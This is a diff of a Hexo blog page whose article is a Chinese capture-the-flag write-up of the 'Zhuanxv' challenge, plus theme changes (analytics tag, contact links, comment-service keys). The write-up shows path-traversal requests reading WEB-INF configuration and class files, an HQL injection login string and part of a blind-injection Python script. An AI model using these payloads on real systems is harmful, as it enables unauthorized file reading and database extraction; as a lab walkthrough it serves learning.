@@ -17,10 +17,20 @@
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-BYTY196ENH');
+    </script>
 
 
     <title>Zhuanxv | hybcx&#39;s blog</title>
@@ -266,7 +276,7 @@
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -323,7 +333,7 @@
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -418,11 +428,6 @@
                 
 
                 
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
             </div>
         </div>
         <hr class="clearfix">
@@ -439,23 +444,23 @@
                 <h2 id="题目描述">题目描述</h2>
 <p>你只是在扫描目标端口的时候发现了一个开放的web服务</p>
 <h2 id="题目解题">题目解题</h2>
-<p><img src="/2023/10/03/zhuanxv/image-20231003104933156.png" alt="image-20231003104933156"></p>
+<p><img src="image-20231003104933156.png" alt="image-20231003104933156"></p>
 <p>打开首页如上图，查找一番没什么信息，直接扔给dirsearch扫一下，结果扫出来个list，添加到url后自动跳转到一个登录页面。</p>
-<p><img src="/2023/10/03/zhuanxv/image-20231003105740971.png" alt="image-20231003105740971"></p>
+<p><img src="image-20231003105740971.png" alt="image-20231003105740971"></p>
 <p>之后测试了几番XSS、sql注入，弱口令但没什么效果，随后就没思路了，之后网上漫游看到了一点思路，于是接着开始尝试，据他的思路进入这里也可以在抓包之后尝试forward放包看看有什么敏感信息，于是乎我放包看到如下</p>
-<p><img src="/2023/10/03/zhuanxv/image-20231003110122750.png" alt="image-20231003110122750"></p>
+<p><img src="image-20231003110122750.png" alt="image-20231003110122750"></p>
 <p>发现这里加载了图片，因为不是咱们上传的，那肯定是后端服务器加载的嘛。于是乎我们可以尝试在此url上读取一些敏感信息，也就是进行目录遍历，然后我又接着尝试读取，但页面虽然返回200，但还是没有信息。无奈再去看wp，发现是路径的错误，他是这样读取的：</p>
 <pre class="line-numbers language-none"><code class="language-none">?fileName=../../WEB-INF/web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>接着他解释了为何web.xml在此处：这是因为写web项目的时候有层级要求，一般效果如图：</p>
-<p><img src="/2023/10/03/zhuanxv/image-20231003110919024.png" alt="image-20231003110919024"></p>
+<p><img src="image-20231003110919024.png" alt="image-20231003110919024"></p>
 <p>static目录一般放置资源等，图片、文本等，一般上上级的WEB-INF会放配置文件，如图：</p>
-<p><img src="/2023/10/03/zhuanxv/image-20231003110928710.png" alt="image-20231003110928710"></p>
+<p><img src="image-20231003110928710.png" alt="image-20231003110928710"></p>
 <p>随后我们访问一下发现如图，是一个下载的bg.jpg图片</p>
-<p><img src="/2023/10/03/zhuanxv/image-20231003111014127.png" alt="image-20231003111014127"></p>
+<p><img src="image-20231003111014127.png" alt="image-20231003111014127"></p>
 <p>这里也可以看到图片中含有struts2框架，但我也不熟悉，只能跟着wp走了。┭┮﹏┭┮</p>
 <p>可以看到，该项目使用的struts2框架（丫的老掉牙了），struts.xml是struts2的核心配置文件，该文件主要负责管理应用中的Action映射，以及该Action包含的Result定义等，因此我们需要读取struts.xml看看，构造payload：</p>
 <pre class="line-numbers language-http" data-language="http"><code class="language-http">/loadimage?fileName=../../WEB-INF/classes/struts.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/10/03/zhuanxv/image-20231003111954722.png" alt="image-20231003111954722"></p>
+<p><img src="image-20231003111954722.png" alt="image-20231003111954722"></p>
 <p>如图发现含有struct2-2.3.dtd，我这里猜测版本是2.3，应该可以利用爆出的漏洞poc来解</p>
 <p>内容如下：</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml versinotallow="1.0" encoding="UTF-8"?&gt;</span>
@@ -514,9 +519,9 @@ loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/DownloadAction.class
 loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/AdminAction.class
 loadimage?fileName=../../WEB-INF/classes/com/cuitctf/util/UserOAuth.class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>下载下来后请记得修改文件名称.class，进行反编译开始代码审计</p>
-<p><img src="/2023/10/03/zhuanxv/image-20231003112723973.png" alt="image-20231003112723973"></p>
+<p><img src="image-20231003112723973.png" alt="image-20231003112723973"></p>
 <p>上图是用idea打开进行反编译，看了一番发现userlogin文件比较可疑</p>
-<p><img src="/2023/10/03/zhuanxv/image-20231003113106962.png" alt="image-20231003113106962"></p>
+<p><img src="image-20231003113106962.png" alt="image-20231003113106962"></p>
 <p>如图发现存在ctf什么的包，那我们构造url访问一下看看</p>
 <pre class="line-numbers language-http" data-language="http"><code class="language-http">loadimage?fileName=../../WEB-INF/classes/com/cuitctf/po/User.class
 loadimage?fileName=../../WEB-INF/classes/com/cuitctf/service/UserService.class
@@ -590,12 +595,12 @@ loadimage?fileName=../../WEB-INF/classes/com/cuitctf/util/InitApplicationContext
 loadimage?fileName=../../WEB-INF/classes/com/cuitctf/service/impl/UserServiceImpl.class
 loadimage?fileName=../../WEB-INF/classes/com/cuitctf/dao/impl/UserDaoImpl.class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>可以看到user.hbm.xml暗示了flag在数据库中位置，如图：</p>
-<p><img src="/2023/10/03/zhuanxv/image-20231003114328182.png" alt="image-20231003114328182"></p>
+<p><img src="image-20231003114328182.png" alt="image-20231003114328182"></p>
 <p>看到table表示表名，column表示列名</p>
 <p>UserServiceImpl.class反编译后，是对登录信息进行了过滤，如图：</p>
-<p><img src="/2023/10/03/zhuanxv/image-20231003114429399.png" alt="image-20231003114429399"></p>
+<p><img src="image-20231003114429399.png" alt="image-20231003114429399"></p>
 <p>UserDaoImpl.class反编译后，是对登录的sql查找，如图：</p>
-<p><img src="/2023/10/03/zhuanxv/image-20231003114452765.png" alt="image-20231003114452765"></p>
+<p><img src="image-20231003114452765.png" alt="image-20231003114452765"></p>
 <p>冥冥之中认为这似乎会联系到sql注入，但印象中java的sql注入很难，毕竟有jdbc的预编译</p>
 <p>此处参考网上大佬的wp，上面图的sql语句使用HSQL，因此构造登录账号密码：</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">from</span> <span class="token keyword">User</span> <span class="token keyword">where</span> name <span class="token operator">=</span><span class="token string">'admin'</span> <span class="token operator">or</span> <span class="token string">'1'</span><span class="token operator">&gt;</span><span class="token string">'0'</span> <span class="token operator">or</span> name <span class="token operator">like</span> <span class="token string">'admin'</span> <span class="token operator">and</span> password <span class="token operator">=</span> <span class="token string">'" + password + "'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -603,7 +608,7 @@ loadimage?fileName=../../WEB-INF/classes/com/cuitctf/dao/impl/UserDaoImpl.class<
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">admin<span class="token string">'%0Aor%0A'</span><span class="token number">1</span><span class="token string">'&gt;'</span><span class="token number">0</span><span class="token string">'%0Aor%0Aname%0Alike%0A'</span>admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>因此用户名：admin’%0Aor%0A’1’&gt;‘0’%0Aor%0Aname%0Alike%0A’admin 密码：123（随便）</p>
 <p>注意一定要使用hackbar进行登录，用主页登录没有反应，如图：</p>
-<p><img src="/2023/10/03/zhuanxv/image-20231003114746635.png" alt="image-20231003114746635"></p>
+<p><img src="image-20231003114746635.png" alt="image-20231003114746635"></p>
 <p>但这个页面似乎什么也点击不了，之后就开始写脚本了</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
 s<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
@@ -622,7 +627,7 @@ flag<span class="token operator">=</span><span class="token string">''</span>
             <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>flag<span class="token punctuation">)</span>
             <span class="token keyword">break</span>
         p<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/03/zhuanxv/image-20231003115614055.png" alt="image-20231003115614055"></p>
+<p><img src="image-20231003115614055.png" alt="image-20231003115614055"></p>
 <p>这里可以爆出flag</p>
 <p>做了这道题发现很多知识都不清楚的，感觉不熟悉Java和xml代码结构，很难看懂，亦或许我太菜了。不过下载之后得针对本篇文章学习一些小知识了：struct2框架基本信息、HSQL语句以及在熟悉一下xml结构。总之，这篇文章值得反复观看。</p>
 <h2 id="参考文章">参考文章</h2>
@@ -718,7 +723,7 @@ flag<span class="token operator">=</span><span class="token string">''</span>
     <div id="rewardModal" class="modal">
         <div class="modal-content">
             <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <h4 class="reward-title">随缘，看各位佬的心情</h4>
             <div class="reward-content">
                 <div class="reward-tabs">
                     <ul class="tabs row">
@@ -726,7 +731,7 @@ flag<span class="token operator">=</span><span class="token string">''</span>
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
                         <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
@@ -1006,12 +1011,12 @@ flag<span class="token operator">=</span><span class="token string">''</span>
 <script>
     new Valine({
         el: '#vcomments',
-        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
-        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
-        serverURLs: '',
+        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
+        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
+        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
         notify: 'false' === 'true',
         verify: 'false' === 'true',
-        visitor: 'true' === 'true',
+        visitor: 'false' === 'true',
         avatar: 'mm',
         pageSize: '10',
         lang: 'zh-cn',
@@ -1156,6 +1161,8 @@ flag<span class="token operator">=</span><span class="token string">''</span>
 
 <!-- 代码块收缩 -->
 
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
 
 
     </div>
@@ -1183,8 +1190,8 @@ flag<span class="token operator">=</span><span class="token string">''</span>
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            collapseDepth: Number('3'),
+            headingSelector: 'h2, h3, h4, h5, h6'
         });
 
         // Set scroll toc fixed.
@@ -1267,8 +1274,6 @@ flag<span class="token operator">=</span><span class="token string">''</span>
             
             
             
-                
-            
             
                 <span id="busuanzi_container_site_pv">
                 &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
@@ -1288,24 +1293,28 @@ flag<span class="token operator">=</span><span class="token string">''</span>
             <br>
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
+        <i class="fab fa-facebook-f"></i>
     </a>
 
 
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
         <i class="fab fa-qq"></i>
     </a>
 
@@ -1517,8 +1526,6 @@ $(function () {
     
     <script src="/libs/others/clicklove.js" async="async"></script>
     
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
     
 
     
